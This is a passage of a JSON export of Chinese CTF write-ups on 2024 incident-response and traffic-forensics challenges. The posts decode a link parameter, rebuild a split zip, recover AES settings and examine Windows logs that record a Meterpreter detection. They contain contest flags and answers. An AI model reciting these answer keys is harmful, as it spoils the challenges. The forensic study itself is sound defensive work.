aCE=\\n\\nHello, this is the access link, <a href=\\"https://autorevertech.com?key=%61%47%6E%76%76%49%78%6D%62%47%46%6E%49%47%6C%7A%49%48%74%55%61%47%55%67%53%6D%39%31%63%6D%35%6C%65%53%42%30%62%79%42%30%61%47%55%67%56%32%56%7A%64%48%30%3D\\">please click and get</a>. Thank you very much!\\n\\nkey=%61%47%6E%76%76%49%78%6D%62%47%46%6E%49%47%6C%7A%49%48%74%55%61%47%55%67%53%6D%39%31%63%6D%35%6C%65%53%42%30%62%79%42%30%61%47%55%67%56%32%56%7A%64%48%30%3D\\n```\\n\\n\u5bf9 `key` \u53c2\u6570\u4e2d\u7684\u6570\u636e\u8fdb\u884c\u89e3\u7801\\n\\n```plaintext\\n%61%47%6E%76%76%49%78%6D%62%47%46%6E%49%47%6C%7A%49%48%74%55%61%47%55%67%53%6D%39%31%63%6D%35%6C%65%53%42%30%62%79%42%30%61%47%55%67%56%32%56%7A%64%48%30%3D\\n\\naGnvvIxmbGFnIGlzIHtUaGUgSm91cm5leSB0byB0aGUgV2VzdH0=\\n\\nhi\uff0cflag is {The Journey to the West}\\n```\\n\\n\u5373\u53ef\u5f97\u5230\u7b54\u6848\\n\\n```flag\\nflag{The Journey to the West}\\n```\\n\\n## 5\\n\\n> \u5206\u6790\u6d41\u91cf\uff0c\u83b7\u5f97\u538b\u7f29\u5305\u4e2d\u5f97\u5230\u7b54\u6848\\n\\n\u5bf9\u6d41\u91cf\u5305\u7b5b\u9009 HTTP \u4f20\u8f93\u7684\u6587\u4ef6\u6d41\u91cf\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e24\u4e2a\u6587\u4ef6\\n\\n![img](img/image_20241211-011128.png)\\n\\n\u5c06\u6587\u4ef6\u5bfc\u51fa\u8fdb\u884c\u5206\u6790\\n\\n![img](img/image_20241214-011415.png)\\n\\n![img](img/image_20241215-011511.png)\\n\\n\u6000\u7591\u539f\u672c\u7684 zip \u6587\u4ef6\u88ab\u62c6\u5206\u4e3a `cilent`+`server` \u4e24\u4e2a\u6587\u4ef6\uff0c\u5c06\u5176\u62fc\u63a5\u8d77\u6765\u5373\u53ef\u5f97\u5230\u6b63\u5e38\u7684 zip \u6587\u4ef6\\n\\n![img](img/image_20241217-011718.png)\\n\\n\u5bf9\u538b\u7f29\u5305\u6587\u4ef6\u8fdb\u884c\u68c0\u67e5\uff0c\u53d1\u73b0\u5b58\u5728\u6709\u538b\u7f29\u5305\u6ce8\u91ca\\n\\n![img](img/image_20241217-011757.png)\\n\\n```plaintext\\n5pe26Ze057q/5YWz6IGU6Z2e5bi46YeN6KaB\\n```\\n\\n\u89e3\u7801\u540e\u5f97\u5230\\n\\n```plaintext\\n\u65f6\u95f4\u7ebf\u5173\u8054\u975e\u5e38\u91cd\u8981\\n```\\n\\n\u5c06\u5176\u4f5c\u4e3a\u5bc6\u7801\u89e3\u538b\u538b\u7f29\u5305\uff0c\u5373\u53ef\u5f97\u5230\u7b54\u6848\\n\\n```plaintext\\nflag{a1b2c3d4e5f67890abcdef1234567890-2f4d90a1b7c8e2349d3f56e0a9b01b8a-CBC}\\n```\\n\\n## 6\\n\\n> \u901a\u8fc7 aes \u89e3\u5bc6\u5f97\u5230\u7684 flag\\n\\n\u5bf9\u4e8e\u4e0a\u4e00\u9898\u7684\u7b54\u6848\u8fdb\u884c\u5206\u6790\uff0c\u53ef\u4ee5\u786e\u5b9a AES \u7684\u53c2\u6570\\n\\n```plaintext\\nMode: CBC\\nKey: a1b2c3d4e5f67890abcdef1234567890\\niv: 2f4d90a1b7c8e2349d3f56e0a9b01b8a\\n```\\n\\n\u5bf9\u653b\u51fb\u8005\u7684 ip \u5730\u5740 `192.168.116.130` \u8fdb\u884c\u7b5b\u9009\\n\\n```plaintext\\nip.addr == 192.168.116.130\\n```\\n\\n![img](img/image_20241224-012455.png)\\n\\n\u7ecf\u8fc7\u6392\u67e5\uff0c\u53d1\u73b0\u53ef\u80fd\u5b58\u5728\u7684 AES \u5bc6\u6587\\n\\n![img](img/image_20241227-012735.png)\\n\\n\u5c1d\u8bd5\u8fdb\u884c\u89e3\u7801\\n\\n![img](img/image_20241230-013016.png)\\n\\n\u5373\u53ef\u5f97\u5230\u7b54\u6848\\n\\n```flag\\nflag{Hey, keep going and look for another flag}\\n```"},{"id":"2024CCB&CISCN-sc05","metadata":{"permalink":"/Target-Machines-WriteUp/blog/2024CCB&CISCN-sc05","editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/blog/2024-12-18-2024CCB&CISCN-sc05/index.md","source":"@site/blog/2024-12-18-2024CCB&CISCN-sc05/index.md","title":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 sc05","description":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 sc05","date":"2024-12-18T00:00:00.000Z","tags":[{"inline":true,"label":"CTF","permalink":"/Target-Machines-WriteUp/blog/tags/ctf"},{"inline":true,"label":"Incident-Response","permalink":"/Target-Machines-WriteUp/blog/tags/incident-response"}],"readingTime":1.84,"hasTruncateMarker":true,"authors":[{"name":"\u9648\u6a58mo","title":"Why So Serious?","url":"https://randark.site","imageURL":"https://raw.githubusercontent.com/TryHackMyOffsecBox/Target-Machines-WriteUp/refs/heads/main/static/img/users/IMG_8925.PNG","key":"Randark","page":null}],"frontMatter":{"slug":"2024CCB&CISCN-sc05","title":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 sc05","authors":"Randark","toc_max_heading_level":5,"tags":["CTF","Incident-Response"]},"unlisted":false,"prevItem":{"title":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 WinFT","permalink":"/Target-Machines-WriteUp/blog/2024CCB&CISCN-WinFT"},"nextItem":{"title":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 zeroshell","permalink":"/Target-Machines-WriteUp/blog/2024CCB&CISCN-zeroshell"}},"content":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 sc05\\n\\n\u5b98\u65b9 writeup \u672a\u516c\u5e03\uff0c\u65e0\u6807\u51c6\u7b54\u6848\\n\\n\x3c!-- truncate --\x3e\\n\\n:::info\\n\\n\u8fd1\u65e5\u67d0\u516c\u53f8\u7f51\u7edc\u7ba1\u7406\u5458\u8001\u5f20\u5728\u5bf9\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u65e5\u5e38\u5de1\u68c0\u8fc7\u7a0b\u4e2d\u53d1\u73b0\u9632\u706b\u5899\u8bbe\u5907\u65e5\u5fd7\u4e2d\u4ea7\u751f\u4e86 1 \u6761\u9ad8\u5371\u544a\u8b66\uff0c\u544a\u8b66 IP \u4e3a 134.6.4.12 (\u7b80\u79f0 IP1)\uff0c\u5728\u76d1\u6d4b\u5230\u53ef\u7591\u7f51\u7edc\u6d3b\u52a8\u540e\uff0c\u8001\u5f20\u7acb\u523b\u5bf9\u78c1\u76d8\u548c\u5185\u5b58\u5236\u505a\u4e86\u955c\u50cf\u3002\u4e3a\u8003\u6821\u81ea\u5df1\u521a\u6536\u7684\u7b2c\u4e00\u4e2a\u5f92\u5f1f\u674e\u534e\uff0c\u8001\u5f20\u5faa\u5e8f\u6e10\u8fdb\uff0c\u5e03\u7f6e\u4e86 5 \u9053\u95ee\u9898\u3002\u5047\u5982\u4f60\u662f\u674e\u534e\uff0c\u8bf7\u4f60\u6839\u636e\u63d0\u4f9b\u7684\u9632\u706b\u5899\u65e5\u5fd7\u3001\u78c1\u76d8\u955c\u50cf\u53ca\u5185\u5b58\u955c\u50cf\u6587\u4ef6\u5bf9\u4e3b\u673a\u5f00\u5c55\u7f51\u7edc\u5b89\u5168\u68c0\u67e5\u5206\u6790\uff0c\u5e76\u6839\u636e 5 \u9053\u95ee\u9898\u63d0\u793a\uff0c\u8ba1\u7b97\u5e76\u63d0\u4ea4\u76f8\u5e94 flag\u3002\\n\\n:::\\n\\n## 1\\n\\n> IP1 \u5730\u5740\u9996\u6b21\u88ab\u8bf7\u6c42\u65f6\u95f4\u662f\u591a\u4e45\uff1f\u8ba1\u7b97\u5185\u5bb9\u5982\uff1a`2020/05/18_19:35:10` \u63d0\u4ea4\u683c\u5f0f\uff1a`flag{32\u4f4d\u5927\u5199MD5\u503c}`\\n\\n## 2\\n\\n> IP1 \u5730\u5740\u5bf9\u5e94\u7684\u5c0f\u9a6c\u7a0b\u5e8f MD5 \u662f\u591a\u5c11\uff1f\u63d0\u4ea4\u683c\u5f0f\uff1a`flag{32\u4f4d\u5927\u5199MD5\u503c}`\\n\\n## 3\\n\\n> \u5927\u9a6c\u7a0b\u5e8f\u8fd0\u884c\u5728\u54ea\u4e2a\u8fdb\u7a0b\u4e2d\uff1f\u8ba1\u7b97\u5185\u5bb9\uff1a`PID-\u8fdb\u7a0b\u540d`\uff0c\u5982 `123-cmd.exe` \u63d0\u4ea4\u683c\u5f0f\uff1a`flag{32\u4f4d\u5927\u5199MD5\u503c}`\\n\\n## 4\\n\\n> \u5927\u9a6c\u7a0b\u5e8f\u5907\u7528\u56de\u8fde\u7684\u57df\u540d\u662f\u591a\u5c11\uff1f\u8ba1\u7b97\u5185\u5bb9\u5982\uff1a`www.baidu.com` \u63d0\u4ea4\u683c\u5f0f\uff1a`flag{32\u4f4d\u5927\u5199MD5\u503c}`\\n\\n## 5\\n\\n> \u653b\u51fb\u8005\u6700\u7ec8\u7a83\u53d6\u6570\u636e\u7684\u6587\u4ef6\u4e2d\u5305\u542b\u7684 flag \u503c\uff1f \u63d0\u4ea4\u683c\u5f0f\uff1a`flag{xxx}`, \u6ce8\u610f\u5927\u5c0f `FLAG{xx}` \u8981\u8f6c\u6362\u4e3a\u5c0f\u5199 `flag{xx}`\\n\\nTODO \u672a\u5b8c\u6210"},{"id":"2024CCB&CISCN-zeroshell","metadata":{"permalink":"/Target-Machines-WriteUp/blog/2024CCB&CISCN-zeroshell","editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/blog/2024-12-18-2024CCB&CISCN-zeroshell/index.md","source":"@site/blog/2024-12-18-2024CCB&CISCN-zeroshell/index.md","title":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 zeroshell","description":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 zeroshell","date":"2024-12-18T00:00:00.000Z","tags":[{"inline":true,"label":"CTF","permalink":"/Target-Machines-WriteUp/blog/tags/ctf"},{"inline":true,"label":"Incident-Response","permalink":"/Target-Machines-WriteUp/blog/tags/incident-response"}],"readingTime":2.26,"hasTruncateMarker":true,"authors":[{"name":"\u9648\u6a58mo","title":"Why So Serious?","url":"https://randark.site","imageURL":"https://raw.githubusercontent.com/TryHackMyOffsecBox/Target-Machines-WriteUp/refs/heads/main/static/img/users/IMG_8925.PNG","key":"Randark","page":null}],"frontMatter":{"slug":"2024CCB&CISCN-zeroshell","title":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 zeroshell","authors":"Randark","toc_max_heading_level":5,"tags":["CTF","Incident-Response"]},"unlisted":false,"prevItem":{"title":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 sc05","permalink":"/Target-Machines-WriteUp/blog/2024CCB&CISCN-sc05"},"nextItem":{"title":"2024 \u7f51\u9f0e\u676f \u534a\u51b3\u8d5b \u5b89\u5168\u8fd0\u8425\u6311\u6218\u8d5b \u5a01\u80c1\u5206\u6790","permalink":"/Target-Machines-WriteUp/blog/2024wdb-Semis IncidentResponse-threat analysis"}},"content":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 zeroshell\\n\\n\u5b98\u65b9 writeup \u672a\u516c\u5e03\uff0c\u65e0\u6807\u51c6\u7b54\u6848\\n\\n\x3c!-- truncate --\x3e\\n\\n:::info\\n\\n\u5c0f\u8def\u662f\u4e00\u540d\u5b9e\u4e60\u751f\uff0c\u63a5\u66ff\u516c\u53f8\u524d\u4efb\u7f51\u7ba1\u7684\u5de5\u4f5c\uff0c\u4e00\u5929\u53d1\u73b0\u516c\u53f8\u7f51\u7edc\u51fa\u53e3\u51fa\u73b0\u4e86\u5f02\u5e38\u7684\u901a\u4fe1\uff0c\u73b0\u9700\u8981\u901a\u8fc7\u56de\u6eaf\u51fa\u53e3\u6d41\u91cf\u5bf9\u5f02\u5e38\u70b9\u4f4d (\u9632\u706b\u5899) \u8fdb\u884c\u5b9a\u4f4d\uff0c\u5e76\u786e\u5b9a\u5f02\u5e38\u7684\u8bbe\u5907\u3002\u7136\u540e\u8fdb\u884c\u6df1\u5ea6\u53d6\u8bc1\u68c0\u67e5\uff08\u9700\u8981\u83b7\u53d6 root \u6743\u9650\uff09\u3002\u73b0\u5728\u9700\u8981\u4f60\u4ece\u7f51\u7edc\u653b\u51fb\u6570\u636e\u5305\u4e2d\u627e\u51fa\u6f0f\u6d1e\u653b\u51fb\u7684\u4f1a\u8bdd\uff0c\u5206\u6790\u4f1a\u8bdd\u7f16\u5199 exp \u6216\u6570\u636e\u5305\u91cd\u653e\u83b7\u53d6\u9632\u706b\u5899\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650\uff0c\u67e5\u627e\u9632\u706b\u5899\u8bbe\u5907\u4e0a\u5b89\u88c5\u7684\u6728\u9a6c\uff0c\u7136\u540e\u5206\u6790\u6728\u9a6c\u5916\u8054\u5730\u5740\u548c\u901a\u4fe1\u5bc6\u94a5\u4ee5\u53ca\u6728\u9a6c\u542f\u52a8\u9879\u4f4d\u7f6e\u3002\\n\\n:::\\n\\n## 1\\n\\n> \u4ece\u6570\u636e\u5305\u4e2d\u627e\u51fa\u653b\u51fb\u8005\u5229\u7528\u6f0f\u6d1e\u5f00\u5c55\u653b\u51fb\u7684\u4f1a\u8bdd\uff08\u653b\u51fb\u8005\u6267\u884c\u4e86\u4e00\u6761\u547d\u4ee4\uff09\uff0c\u5199\u51fa\u8be5\u4f1a\u8bdd\u4e2d\u8bbe\u7f6e\u7684 flag, \u7ed3\u679c\u63d0\u4ea4\u5f62\u5f0f\uff1a`flag{xxxxxxxxx}`\\n\\n## 2\\n\\n> \u901a\u8fc7\u6f0f\u6d1e\u5229\u7528\u83b7\u53d6\u8bbe\u5907\u63a7\u5236\u6743\u9650\uff0c\u7136\u540e\u67e5\u627e\u8bbe\u5907\u4e0a\u7684 flag \u6587\u4ef6\uff0c\u63d0\u53d6 flag \u6587\u4ef6\u5185\u5bb9\uff0c\u7ed3\u679c\u63d0\u4ea4\u5f62\u5f0f\uff1a`flag{xxxxxxxxxx}`\\n\\n## 3\\n\\n> \u627e\u51fa\u53d7\u63a7\u673a\u9632\u706b\u5899\u8bbe\u5907\u4e2d\u9a7b\u7559\u6728\u9a6c\u7684\u5916\u8054\u57df\u540d\u6216 IP \u5730\u5740\uff0c\u7ed3\u679c\u63d0\u4ea4\u5f62\u5f0f\uff1a`flag{xxxx}`\uff0c\u5982 `flag{www.abc.com}` \u6216 `flag{16.122.33.44}`\\n\\n## 4\\n\\n> \u8bf7\u5199\u51fa\u6728\u9a6c\u8fdb\u7a0b\u6267\u884c\u7684\u672c\u4f53\u6587\u4ef6\u7684\u540d\u79f0\uff0c\u7ed3\u679c\u63d0\u4ea4\u5f62\u5f0f\uff1a`flag{xxxxx}`\uff0c\u4ec5\u5199\u6587\u4ef6\u540d\u4e0d\u52a0\u8def\u5f84\\n\\n## 5\\n\\n> \u8bf7\u63d0\u53d6\u9a7b\u7559\u7684\u6728\u9a6c\u672c\u4f53\u6587\u4ef6\uff0c\u901a\u8fc7\u9006\u5411\u5206\u6790\u627e\u51fa\u6728\u9a6c\u6837\u672c\u901a\u4fe1\u4f7f\u7528\u7684\u52a0\u5bc6\u5bc6\u94a5\uff0c\u7ed3\u679c\u63d0\u4ea4\u5f62\u5f0f\uff1a`flag{xxxx}`\\n\\n## 6\\n\\n> \u8bf7\u5199\u51fa\u9a7b\u7559\u6728\u9a6c\u7684\u542f\u52a8\u9879\uff0c\u6ce8\u610f\u5199\u51fa\u542f\u52a8\u6587\u4ef6\u7684\u5b8c\u6574\u8def\u5f84\u3002\u7ed3\u679c\u63d0\u4ea4\u5f62\u5f0f\uff1a`flag{xxxx}`\uff0c\u5982 `flag{/a/b/c}`\\n\\nTODO \u672a\u5b8c\u6210"},{"id":"2024wdb-Semis IncidentResponse-threat analysis","metadata":{"permalink":"/Target-Machines-WriteUp/blog/2024wdb-Semis IncidentResponse-threat analysis","editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/blog/2024-12-02-wdb-Semis-IncidentResponse-threat analysis/index.md","source":"@site/blog/2024-12-02-wdb-Semis-IncidentResponse-threat analysis/index.md","title":"2024 \u7f51\u9f0e\u676f \u534a\u51b3\u8d5b \u5b89\u5168\u8fd0\u8425\u6311\u6218\u8d5b \u5a01\u80c1\u5206\u6790","description":"2024 \u7f51\u9f0e\u676f \u534a\u51b3\u8d5b \u5b89\u5168\u8fd0\u8425\u6311\u6218\u8d5b \u5a01\u80c1\u5206\u6790","date":"2024-12-02T00:00:00.000Z","tags":[{"inline":true,"label":"CTF","permalink":"/Target-Machines-WriteUp/blog/tags/ctf"},{"inline":true,"label":"Incident-Response","permalink":"/Target-Machines-WriteUp/blog/tags/incident-response"}],"readingTime":18.465,"hasTruncateMarker":true,"authors":[{"name":"\u9648\u6a58mo","title":"Why So Serious?","url":"https://randark.site","imageURL":"https://raw.githubusercontent.com/TryHackMyOffsecBox/Target-Machines-WriteUp/refs/heads/main/static/img/users/IMG_8925.PNG","key":"Randark","page":null}],"frontMatter":{"slug":"2024wdb-Semis IncidentResponse-threat analysis","title":"2024 \u7f51\u9f0e\u676f \u534a\u51b3\u8d5b \u5b89\u5168\u8fd0\u8425\u6311\u6218\u8d5b \u5a01\u80c1\u5206\u6790","authors":"Randark","toc_max_heading_level":5,"tags":["CTF","Incident-Response"]},"unlisted":false,"prevItem":{"title":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 zeroshell","permalink":"/Target-Machines-WriteUp/blog/2024CCB&CISCN-zeroshell"},"nextItem":{"title":"2024 \u5f3a\u7f51\u676f Master of DFIR","permalink":"/Target-Machines-WriteUp/blog/2024qwbs8 Master of DFIR"}},"content":"2024 \u7f51\u9f0e\u676f \u534a\u51b3\u8d5b \u5b89\u5168\u8fd0\u8425\u6311\u6218\u8d5b \u5a01\u80c1\u5206\u6790\\n\\n\u5b98\u65b9 writeup \u672a\u516c\u5e03\uff0c\u65e0\u6807\u51c6\u7b54\u6848\\n\\n\x3c!-- truncate --\x3e\\n\\n\u6309\u7167\u9898\u76ee\u63cf\u8ff0\u8fdb\u884c\u68c0\u6750\u5206\u6790\\n\\n## First of all - \u5728\u6b64\u4e4b\u524d\\n\\n\u5bf9\u9898\u76ee\u63d0\u4f9b\u7684\u9644\u4ef6\u8fdb\u884c\u5206\u6790\uff0c\u9898\u76ee\u63d0\u4f9b\u4e86\u4ee5\u4e0b\u9644\u4ef6\\n\\n- dump.mem\\n- disk.ad1\\n- disk.ad1.txt\\n\\n\u5176\u4e2d\uff0c\u6587\u4ef6 `disk.ad1.txt` \u7684\u5185\u5bb9\u4e3a\\n\\n```plaintext\\nCreated By AccessData\xae FTK\xae Imager 4.7.1.2\\n\\nCase Information:\\nAcquired using: ADI4.7.1.2\\nCase Number:\\nEvidence Number:\\nUnique Description:\\nExaminer:\\nNotes:\\n\\n--------------------------------------------------------------\\n\\nInformation for C:\\\\Users\\\\skills\\\\Desktop\\\\disk.ad1:\\n[Custom Content Sources]\\n F:\\\\:NONAME [NTFS]|[root]|Windows|*(Wildcard,Consider Case,Include Subdirectories)\\n F:\\\\:NONAME [NTFS]|[root]|ProgramData|*(Wildcard,Consider Case,Include Subdirectories)\\n F:\\\\:NONAME [NTFS]|[root]|Program Files (x86)|*(Wildcard,Consider Case,Include Subdirectories)\\n F:\\\\:NONAME [NTFS]|[root]|Program Files|*(Wildcard,Consider Case,Include Subdirectories)\\n F:\\\\:NONAME [NTFS]|[root]|Documents and Settings|*(Wildcard,Consider Case,Include Subdirectories)\\n F:\\\\:NONAME [NTFS]|[root]|PerfLogs|*(Wildcard,Consider Case,Include Subdirectories)\\n F:\\\\:NONAME [NTFS]|[root]|System Volume Information|*(Wildcard,Consider Case,Include Subdirectories)\\n[Computed Hashes]\\n MD5 checksum:    a576646c40769abb7dd36904417b6a4f\\n SHA1 checksum:   9cee1fe36957674626661e1197b19b5f0b047026\\n\\nImage information:\\n Acquisition started:   Tue Nov  5 11:04:42 2024\\n Acquisition finished:  Tue Nov  5 11:49:00 2024\\n Segment list:\\n  C:\\\\Users\\\\skills\\\\Desktop\\\\disk.ad1\\n\\nImage Verification Results:\\n Verification started:  Tue Nov  5 11:52:50 2024\\n Verification finished: Tue Nov  5 12:07:07 2024\\n MD5 checksum:    a576646c40769abb7dd36904417b6a4f : verified\\n SHA1 checksum:   9cee1fe36957674626661e1197b19b5f0b047026 : verified\\n```\\n\\n\u7531\u6b64\u53ef\u4ee5\u5f97\u77e5\uff0c\u6587\u4ef6 `disk.ad1` \u662f\u7531 `FTK Imager` \u6240\u5236\u4f5c\u7684\u78c1\u76d8\u955c\u50cf\uff0c\u6587\u4ef6 `dump.mem` \u662f\u76ee\u6807\u8ba1\u7b97\u673a\u4e0a\u6355\u83b7\u7684\u5185\u5b58\u955c\u50cf\\n\\n\u5bf9\u4e8e `disk.ad1` \u6587\u4ef6\uff0c\u53ef\u4ee5\u4f7f\u7528 `FTK Imager` \u8fdb\u884c\u52a0\u8f7d\u5e76\u6302\u8f7d\u5230\u865a\u62df\u76d8\u7b26\uff1b\u800c\u5bf9\u4e8e `dump.mem` \u6587\u4ef6\uff0c\u53ef\u4ee5\u4f7f\u7528 `Volatility` \u8fdb\u884c\u53d6\u8bc1\u5206\u6790\uff08\u9700\u8981\u5185\u5b58\u955c\u50cf\u4e2d\u7cfb\u7edf\u7248\u672c\u5bf9\u5e94\u7684\u7b26\u53f7\u8868\uff09\u6216\u8005\u4f7f\u7528 `R-Studio` \u5bf9\u5185\u5b58\u4e2d\u7684 `NTFS` \u7ed3\u6784\u8868\u8fdb\u884c\u8bfb\u53d6\u5206\u6790\uff0c\u6216\u8005\u76f4\u63a5\u4f7f\u7528 `Strings` \u8fdb\u884c\u66b4\u529b\u68c0\u7d22\u5206\u6790\\n\\n## \u5a01\u80c1\u5206\u6790 - 01\\n\\n> \u5728\u8c03\u67e5\u7f51\u7edc\u6027\u80fd\u6216\u5b89\u5168\u95ee\u9898\u65f6\uff0c\u4e86\u89e3\u7279\u5b9a\u5e94\u7528\u7a0b\u5e8f\u5728\u4e00\u6bb5\u65f6\u95f4\u5185\u7684\u6570\u636e\u4f20\u8f93\u60c5\u51b5\u5bf9\u4e8e\u68c0\u6d4b\u5f02\u5e38\u6d41\u91cf\u548c\u6f5c\u5728\u5a01\u80c1\u81f3\u5173\u91cd\u8981\u3002\u901a\u8fc7\u5206\u6790\u7f51\u7edc\u6d3b\u52a8\u65e5\u5fd7\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u662f\u5426\u5b58\u5728\u6570\u636e\u6cc4\u9732\u6216\u5f02\u5e38\u901a\u4fe1\u3002\\n>\\n> \u8bf7\u95ee\uff0cfirefox \u8fdb\u7a0b\u81ea\u6709\u8bb0\u5f55\u4ee5\u6765\u4e00\u5171\u53d1\u9001\u4e86\u591a\u5c11\u5b57\u8282\u7684\u6570\u636e\uff1f\uff08\u8bf7\u5c06\u7b54\u6848\u7f16\u8f91\u5e76\u5b58\u5165 `/opt/wxfx/answer/1.txt` \u6587\u4ef6\u4e2d\uff0c\u53c2\u8003 `/opt/wxfx/example` \u76ee\u5f55\uff09\\n\\n\u57fa\u4e8e\u9898\u76ee\u63cf\u8ff0\uff0c\u53ef\u4ee5\u5b9a\u4f4d\u5230 Windows \u7684\u670d\u52a1\u62a5\u544a\u4f7f\u7528\u6570\u636e\u5e93\u6587\u4ef6 `SRUDB.dat`\\n\\n\u53c2\u8003\u8d44\u6599 [See all Windows 11 network data usage \u2013 addshore](https://addshore.com/2023/10/see-all-windows-11-network-data-usage/)\\n\\n\u5728 `FTK Imager` \u5b9a\u4f4d\u5230 `SRUDB.dat` \u6587\u4ef6\u7684\u8def\u5f84 `F:\\\\Windows\\\\System32\\\\sru\\\\SRUDB.dat`\\n\\n![img](img/image_20241205-120525.png)\\n\\n\u4f7f\u7528 [NetworkUsageView - NirSoft](https://www.nirsoft.net/utils/network_usage_view.html) \u8fdb\u884c\u67e5\u770b\\n\\n![img](img/image_20241206-120620.png)\\n\\n\u5b9a\u4f4d\u5230 `firefox.exe` \u8fdb\u7a0b\u7684\u8bb0\u5f55\\n\\n![img](img/image_20241207-120738.png)\\n\\n```plaintext\\n3981907 + 384784 = 4366691\\n```\\n\\n\u5373\u53ef\u786e\u5b9a\u7b54\u6848\\n\\n```flag\\n4366691\\n```\\n\\n## \u5a01\u80c1\u5206\u6790 - 02\\n\\n> \u8bc6\u522b\u5b89\u5168\u9632\u62a4\u8f6f\u4ef6\u7684\u67e5\u6740\u8bb0\u5f55\uff0c\u5bf9\u4e8e\u8bc4\u4f30\u7cfb\u7edf\u53d7\u611f\u67d3\u7684\u7a0b\u5ea6\u548c\u4e86\u89e3\u653b\u51fb\u8005\u6240\u4f7f\u7528\u7684\u5de5\u5177\u81f3\u5173\u91cd\u8981\u3002\u901a\u8fc7\u68c0\u67e5\u5b89\u5168\u65e5\u5fd7\uff0c\u53ef\u4ee5\u83b7\u53d6\u88ab\u68c0\u6d4b\u5230\u7684\u5a01\u80c1\u4fe1\u606f\u3002\\n>\\n> \u8bf7\u95ee\uff0cWindows Defender \u68c0\u6d4b\u5230\u7684\u7b2c\u4e00\u4e2a\u6076\u610f\u8f6f\u4ef6\u7684\u5a01\u80c1 ID \u662f\u4ec0\u4e48\uff1f\uff08\u8bf7\u5c06\u7b54\u6848\u7f16\u8f91\u5e76\u5b58\u5165 `/opt/wxfx/answer/2.txt` \u6587\u4ef6\u4e2d\uff0c\u53c2\u8003 `/opt/wxfx/example` \u76ee\u5f55\uff09\\n\\n\u5728 `disk.ad1` \u6587\u4ef6\u7684\u78c1\u76d8\u6570\u636e\u4e2d\uff0c\u5b9a\u4f4d\u5230 `F:\\\\Windows\\\\System32\\\\winevt\\\\Logs\\\\` \u6587\u4ef6\u5939\\n\\n![img](img/image_20241220-232047.png)\\n\\n\u5c06\u6574\u4e2a\u6587\u4ef6\u5939\u8fdb\u884c\u63d0\u53d6\\n\\n![img](img/image_20241221-232113.png)\\n\\n\u6839\u636e Windows Defender \u7684\u65e5\u5fd7 ID \u8868 [Microsoft Defender Antivirus event IDs and error codes - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus) \u53ef\u4ee5\u77e5\u9053\uff0c\u5f53 Windows Defender \u68c0\u6d4b\u5230\u5a01\u80c1\u65f6\u6240\u8bb0\u5f55\u7684\u65e5\u5fd7\uff0c\u5176\u65e5\u5fd7 ID \u4e3a `1116`\\n\\n\u4f7f\u7528 [FullEventLogView - NirSoft](https://www.nirsoft.net/utils/full_event_log_view.html) \u8fdb\u884c\u5206\u6790\\n\\n![img](img/image_20241228-232844.png)\\n\\n\u6216\u8005\u76f4\u63a5\u5b9a\u4f4d\u5230 Windows Defender \u7684\u64cd\u4f5c\u65e5\u5fd7\u6587\u4ef6 `Microsoft-Windows-Windows Defender%4Operational.evtx`\\n\\n![img](img/image_20241229-232905.png)\\n\\n```plaintext\\nWindows Defender \u5df2\u4ece\u9694\u79bb\u533a\u5220\u9664\u4e00\u4e2a\u9879\u76ee\u3002\\n \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u4ee5\u4e0b\u5185\u5bb9:\\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Meterpreter.O&threatid=2147729928&enterprise=0\\n  \u540d\u79f0: Trojan:Win32/Meterpreter.O\\n  ID: 2147729928\\n  \u4e25\u91cd\u6027: Severe\\n  \u7c7b\u522b: Trojan\\n  \u7528\u6237: DESKTOP-M3JIVN3\\\\skills\\n  \u5b89\u5168\u667a\u80fd\u7248\u672c: AV: 1.421.82.0, AS: 1.421.82.0\\n  